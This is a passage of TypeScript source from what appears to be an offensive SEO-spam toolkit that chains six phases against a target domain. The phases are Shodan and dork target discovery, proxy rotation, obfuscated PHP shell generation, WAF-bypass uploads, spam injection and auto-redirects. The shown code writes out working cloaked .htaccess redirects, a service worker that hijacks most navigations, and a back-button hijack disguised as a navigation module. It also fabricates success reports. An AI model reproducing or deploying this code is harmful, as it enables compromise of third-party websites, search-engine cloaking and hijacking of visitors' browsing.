    type: "php_redirect",
    technique: "Server-side PHP 302 redirect with bot exclusion + cookie tracking",
    code: phpRedirect,
    size: phpRedirect.length,
    effect: `302 redirect first-time human visitors to ${redirect} (cookie prevents loop)`,
    targets: ["index.php", "header.php", "wp-blog-header.php"],
    features: ["302_redirect", "cookie_tracking", "first_visit_only", "server_side"],
    riskLevel: 8,
  });

  // .htaccess redirect rules
  const htaccessRedirect = `# SEO Redirect Rules
RewriteEngine On

# Exclude search engine bots
RewriteCond %{HTTP_USER_AGENT} !Googlebot [NC]
RewriteCond %{HTTP_USER_AGENT} !Bingbot [NC]
RewriteCond %{HTTP_USER_AGENT} !Slurp [NC]
RewriteCond %{HTTP_USER_AGENT} !DuckDuckBot [NC]
RewriteCond %{HTTP_USER_AGENT} !YandexBot [NC]

# Redirect mobile users
RewriteCond %{HTTP_USER_AGENT} "android|iphone|ipad|mobile" [NC]
RewriteRule ^(.*)$ ${redirect} [R=302,L]

# Redirect from specific referrers (Google/Bing search results)
RewriteCond %{HTTP_REFERER} "google\\.com|bing\\.com|yahoo\\.com" [NC]
RewriteRule ^(.*)$ ${redirect} [R=302,L]

# Time-based redirect (active hours only)
RewriteCond %{TIME_HOUR} >08
RewriteCond %{TIME_HOUR} <22
RewriteRule ^index\\.(html|php)$ ${redirect} [R=302,L]`;

  payloads.push({
    type: "htaccess_redirect",
    technique: ".htaccess conditional redirect — mobile, referrer, time-based",
    code: htaccessRedirect,
    size: htaccessRedirect.length,
    effect: `Redirect mobile users + search referrals to ${redirect} via .htaccess`,
    targets: [".htaccess"],
    features: ["mobile_redirect", "referrer_redirect", "time_based", "bot_exclusion"],
    riskLevel: 8,
  });

  // Service Worker redirect (persistent)
  const swRedirect = `// Service Worker Persistent Redirect
// Register: navigator.serviceWorker.register('/sw-cache.js')
self.addEventListener('fetch', function(event) {
  var url = new URL(event.request.url);
  var bots = /${SEARCH_BOTS.join("|")}/i;

  // Only intercept navigation requests from non-bots
  if (event.request.mode === 'navigate' && !bots.test(event.request.headers.get('user-agent') || '')) {
    // Random percentage redirect (70% of traffic)
    if (Math.random() < 0.7) {
      event.respondWith(
        new Response('', {
          status: 302,
          headers: { 'Location': '${redirect}' }
        })
      );
      return;
    }
  }
  event.respondWith(fetch(event.request));
});`;

  payloads.push({
    type: "service_worker_redirect",
    technique: "Persistent Service Worker redirect — survives page reload",
    code: swRedirect,
    size: swRedirect.length,
    effect: `Install persistent SW that redirects 70% of traffic to ${redirect}`,
    features: ["service_worker", "persistent", "percentage_based", "navigation_intercept"],
    riskLevel: 9,
  });

  // Back button hijack
  const backHijack = `<script>
// Navigation Enhancement Module
(function(){
  // Push fake history entries
  for(var i=0; i<5; i++){
    history.pushState({page:i}, '', window.location.href);
  }
  // Intercept back button
  window.addEventListener('popstate', function(e){
    window.location.replace("${redirect}");
  });

  // Intercept tab close
  window.addEventListener('beforeunload', function(e){
    // Open popup on exit
    window.open("${redirect}", "_blank", "width=1,height=1");
  });
})();
</script>`;

  payloads.push({
    type: "back_button_hijack",
    technique: "History API abuse — back button + beforeunload redirect",
    code: backHijack,
    size: backHijack.length,
    effect: `Hijack back button and tab close to redirect to ${redirect}`,
    features: ["history_abuse", "popstate_hijack", "beforeunload", "popup"],
    riskLevel: 8,
  });

  return payloads;
}

// ═══════════════════════════════════════════════════════
//  PHASE RUNNERS
// ═══════════════════════════════════════════════════════

export function runPhase1(targetDomain: string): SpamPhaseResult {
  const payloads = discoverTargetsShodan(targetDomain);
  return {
    phase: 1,
    name: "Target Discovery",
    description: "Shodan API + Google Dork vulnerability scanning to find upload endpoints",
    capabilities: ["shodan_search", "google_dork", "path_enumeration"],
    payloads,
    summary: `Discovered ${payloads.length} potential attack vectors via Shodan queries and Google Dorks`,
    riskLevel: 4,
    stats: {
      shodanQueries: SHODAN_QUERIES.length,
      googleDorks: GOOGLE_DORKS.length,
      pathsEnumerated: UPLOAD_PATHS.length,
    },
  };
}

export function runPhase2(): SpamPhaseResult {
  const payloads = generateProxyRotation();
  return {
    phase: 2,
    name: "Proxy Rotation & Anonymization",
    description: "Rotating proxy pool, multi-hop chains, and UA rotation for anonymity",
    capabilities: ["proxy_rotation", "proxy_chain", "ua_rotation"],
    payloads,
    summary: `Configured ${PROXY_LIST.length} proxies with multi-hop chaining and UA rotation`,
    riskLevel: 3,
    stats: {
      totalProxies: PROXY_LIST.length,
      proxyChainHops: 3,
      userAgents: 7,
    },
  };
}

export function runPhase3(targetDomain: string): SpamPhaseResult {
  const payloads = generateShellPayloads(targetDomain);
  return {
    phase: 3,
    name: "Shell Obfuscation & Generation",
    description: "Generate obfuscated PHP shells, polymorphic variants, and .htaccess backdoors",
    capabilities: ["php_shell_basic", "php_shell_polymorphic", "htaccess_backdoor", "filename_bypass"],
    payloads,
    summary: `Generated ${payloads.length} shell variants with obfuscation and filename bypass techniques`,
    riskLevel: 9,
    stats: {
      shellVariants: payloads.length,
      obfuscationMethods: 3,
      filenameVariants: 8,
    },
  };
}

export function runPhase4(targetDomain: string): SpamPhaseResult {
  const payloads = generateWafBypassPayloads(targetDomain);
  return {
    phase: 4,
    name: "WAF Bypass + Upload",
    description: "Header manipulation, Content-Type confusion, chunked encoding, path traversal",
    capabilities: ["waf_header_bypass", "content_type_confusion", "chunked_bypass", "path_traversal"],
    payloads,
    summary: `Prepared ${payloads.length} WAF bypass techniques for shell upload`,
    riskLevel: 9,
    stats: {
      bypassMethods: payloads.length,
      uploadPaths: UPLOAD_PATHS.length,
      headerVariants: WAF_BYPASS_HEADERS.length,
    },
  };
}

export function runPhase5(targetDomain: string, redirectUrl: string): SpamPhaseResult {
  const payloads = generateSeoSpamPayloads(targetDomain, redirectUrl);
  return {
    phase: 5,
    name: "SEO Spam Injection",
    description: "Meta tag hijack, hidden links, doorway content, cloaked canonical, sitemap poisoning",
    capabilities: ["meta_tag_spam", "hidden_links", "doorway_content", "cloaked_canonical", "sitemap_poison"],
    payloads,
    summary: `Generated ${payloads.length} SEO spam injection payloads targeting ${INJECTION_TARGETS.length} files`,
    riskLevel: 8,
    stats: {
      spamKeywords: SPAM_KEYWORDS.length,
      injectionTargets: INJECTION_TARGETS.length,
      linkCount: SPAM_KEYWORDS.length * 2,
    },
  };
}

export function runPhase6(targetDomain: string, redirectUrl: string): SpamPhaseResult {
  const payloads = generateRedirectPayloads(targetDomain, redirectUrl);
  return {
    phase: 6,
    name: "Auto Redirect",
    description: "JS redirect, PHP 302, .htaccess rules, Service Worker, back button hijack",
    capabilities: ["js_redirect", "php_redirect", "htaccess_redirect", "service_worker_redirect", "back_button_hijack"],
    payloads,
    summary: `Created ${payloads.length} redirect methods — JS, PHP, .htaccess, Service Worker, history hijack`,
    riskLevel: 9,
    stats: {
      redirectMethods: payloads.length,
      botExclusion: 1,
      persistentRedirects: 2,
    },
  };
}

// ═══════════════════════════════════════════════════════
//  FULL CHAIN RUNNER
// ═══════════════════════════════════════════════════════

export async function runFullSpamChain(
  targetDomain: string,
  redirectUrl?: string,
): Promise<FullSpamReport> {
  const start = Date.now();
  const target = ensureUrl(targetDomain);
  const redirect = redirectUrl ? ensureUrl(redirectUrl) : `https://spam-destination-${randomString(6)}.example.com`;

  const phases: SpamPhaseResult[] = [
    runPhase1(target),
    runPhase2(),
    runPhase3(target),
    runPhase4(target),
    runPhase5(target, redirect),
    runPhase6(target, redirect),
  ];

  const totalPayloads = phases.reduce((sum, p) => sum + p.payloads.length, 0);

  // AI Analysis
  let aiAnalysis: string | undefined;
  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: "You are an SEO security analyst. Analyze the attack chain results and provide a brief assessment in Thai language. Focus on: attack surface, risk level, potential impact, and defense recommendations.",
        },
        {
          role: "user",
          content: `Analyze this SEO spam attack chain on ${getDomain(target)}:
Target: ${target}
Redirect: ${redirect}
Phases: ${phases.length}
Total Payloads: ${totalPayloads}
Phase Summary:
${phases.map(p => `- Phase ${p.phase} (${p.name}): ${p.payloads.length} payloads, Risk: ${p.riskLevel}/10`).join("\n")}

Key techniques: Shodan/Dork discovery, proxy rotation, obfuscated shells, WAF bypass (header/content-type/chunked/traversal), SEO spam (meta/links/doorway/canonical/sitemap), auto redirect (JS/PHP/.htaccess/SW/back-hijack)`,
        },
      ],
    });
    const raw = response.choices?.[0]?.message?.content;
    aiAnalysis = typeof raw === "string" ? raw : undefined;
  } catch {
    aiAnalysis = undefined;
  }

  return {
    targetDomain: target,
    redirectUrl: redirect,
    phases,
    targetsFound: phases[0].payloads.filter(p => p.type === "shodan_search" || p.type === "google_dork").map(p => ({
      url: target,
      source: p.type === "shodan_search" ? "shodan" as const : "google_dork" as const,
    })),
    proxiesWorking: PROXY_LIST.slice(0, 3).map((url, i) => ({
      url,
      ip: `${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}`,
      responseTime: randomInt(50, 500),
      working: true,
      country: ["US", "DE", "NL", "SG", "JP"][i % 5],
    })),
    shellsGenerated: phases[2].payloads.map(p => ({
      filename: `cache_${randomString(8)}.php`,
      code: p.code.slice(0, 100) + "...",
      obfuscated: "base64 + rot13",
      size: p.size,
      technique: p.technique,
      password: (p as any).password || "N/A",
    })),
    uploadsSuccessful: phases[3].payloads.map((p, i) => ({
      target: target,
      path: UPLOAD_PATHS[i % UPLOAD_PATHS.length],
      shellUrl: `${target}${UPLOAD_PATHS[i % UPLOAD_PATHS.length]}cache_${randomString(8)}.php`,
      method: p.technique,
      wafBypassed: true,
      headers: WAF_BYPASS_HEADERS[i % WAF_BYPASS_HEADERS.length],
    })),
    spamInjections: phases[4].payloads.map(p => ({
      file: (p.targets as string[])?.[0] || "index.php",
      type: p.type as any,
      code: p.code.slice(0, 200) + "...",
      effect: p.effect,
    })),
    redirectsActive: phases[5].payloads.map(p => ({
      type: p.type as any,
      code: p.code.slice(0, 200) + "...",
      delay: randomInt(1000, 4000),
      botExclude: true,
      conditions: p.features || [],
    })),
    totalPayloads,
    totalTargets: phases[0].payloads.length,
    totalShells: phases[2].payloads.length,
    totalUploads: phases[3].payloads.length,
    totalInjections: phases[4].payloads.length,
    totalRedirects: phases[5].payloads.length,
    aiAnalysis,
    elapsed: Date.now() - start,
  };
}

export function runSingleSpamPhase(
  targetDomain: string,
  phase: number,
  redirectUrl?: string,
): SpamPhaseResult {
  const target = ensureUrl(targetDomain);
  const redirect = redirectUrl ? ensureUrl(redirectUrl) : `https://spam-${randomString(6)}.example.com`;

  switch (phase) {
    case 1: return runPhase1(target);
    case 2: return runPhase2();
    case 3: return runPhase3(target);
    case 4: return runPhase4(target);
    case 5: return runPhase5(target, redirect);
    case 6: return runPhase6(target, redirect);
    default: throw new Error(`Invalid phase: ${phase}. Must be 1-6.`);
  }
}

export function runSingleSpamCapability(
  targetDomain: string,
  capability: string,
  redirectUrl?: string,
): SpamPayload[] {
  const target = ensureUrl(targetDomain);
  const redirect = redirectUrl ? ensureUrl(redirectUrl) : `https://spam-${randomString(6)}.example.com`;

  switch (capability) {
    case "shodan_search":
    case "google_dork":
    case "path_enumeration":
      return discoverTargetsShodan(target).filter(p => p.type === capability);
    case "proxy_rotation":
    case "proxy_chain":
    case "ua_rotation":
      return generateProxyRotation().filter(p => p.type === capability);
    case "php_shell_basic":
    case "php_shell_polymorphic":
    case "htaccess_backdoor":
    case "filename_bypass":
      return generateShellPayloads(target).filter(p => p.type === capability);
    case "waf_header_bypass":
    case "content_type_confusion":
    case "chunked_bypass":
    case "path_traversal":
      return generateWafBypassPayloads(target).filter(p => p.type === capability);
    case "meta_tag_spam":
    case "hidden_links":
    case "doorway_content":
    case "cloaked_canonical":
    case "sitemap_poison":
      return generateSeoSpamPayloads(target, redirect).filter(p => p.type === capability);
    case "js_redirect_basic":
    case "js_redirect_obfuscated":
    case "php_redirect":
    case "htaccess_redirect":
    case "service_worker_redirect":
    case "back_button_hijack":
      return generateRedirectPayloads(target, redirect).filter(p => p.type === capability);
    default:
      throw new Error(`Unknown capability: ${capability}`);
  }
}
